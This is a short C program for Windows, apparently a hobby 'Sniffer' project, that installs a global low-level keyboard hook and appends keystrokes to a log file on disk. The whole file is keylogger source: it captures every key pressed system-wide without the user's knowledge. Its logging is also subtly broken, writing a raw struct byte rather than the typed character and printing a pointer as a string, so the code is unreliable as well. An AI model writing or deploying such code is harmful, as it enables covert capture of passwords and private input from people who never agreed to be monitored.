#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <assert.h>

HHOOK keyboardHook;
HANDLE filehandle;
int writeKeyToFile(PKBDLLHOOKSTRUCT key);

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    //a key was pressed
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
    {
        writeKeyToFile(key);
        printf("%s", key);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    
    keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
    //int pid = GetWindowThreadProcessId(hwnd, 0);
    //printf("%d\n", pid);
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0) != 0);
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}

int writeKeyToFile(PKBDLLHOOKSTRUCT key)
{
    DWORD dwBytesWritten;
    char *filename = "C:\\Users\\amitz\\source\\repos\\Sniffer\\log.txt";
    filehandle = CreateFileA(TEXT(filename), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (filehandle == INVALID_HANDLE_VALUE) {
        printf("\nCould not open %s.\n", filename);
        return 1;
    }
    int ret = WriteFile(filehandle, key, 1, &dwBytesWritten, NULL);
    if (ret != 1) {
        printf("\nfailed to write %s to file.\n", key);
    }
    CloseHandle(filehandle);
    return 0;
}
